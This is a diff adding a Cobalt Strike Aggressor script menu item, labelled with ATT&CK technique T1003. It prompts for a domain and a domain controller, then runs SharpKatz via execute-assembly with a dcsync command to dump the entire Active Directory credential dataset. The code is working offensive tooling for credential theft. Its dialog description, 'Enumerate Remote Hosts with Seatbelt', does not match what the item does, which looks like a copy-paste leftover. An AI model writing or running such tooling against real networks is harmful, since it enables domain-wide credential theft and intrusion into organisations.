@@ -1,0 +1,24 @@
+item "SharpKatz Export Entire Dataset From AD  - T1003"{
+	local('$bid');
+		foreach $bid ($1){
+			skdcsyncdataset($bid);
+		}
+	}
+
+sub skdcsyncdataset{
+ $bid = $1;
+    $dialog = dialog("SharpKatz Dump Entire Dataset From AD", %(fqdn => "", dc => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "--Command dcsync --Domain $3['fqdn'] --DomainController $3['dc'] /ptt";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Dumping Creds...');
+            bexecute_assembly($bid, script_resource('exe/SharpKatz.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Enumerate Remote Hosts with Seatbelt");
+    drow_text($dialog, "fqdn",  "Please Enter the FQDN:");
+    drow_text($dialog, "dc",  "Please Enter the FQDN of the Domain Controller:");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+
+}		
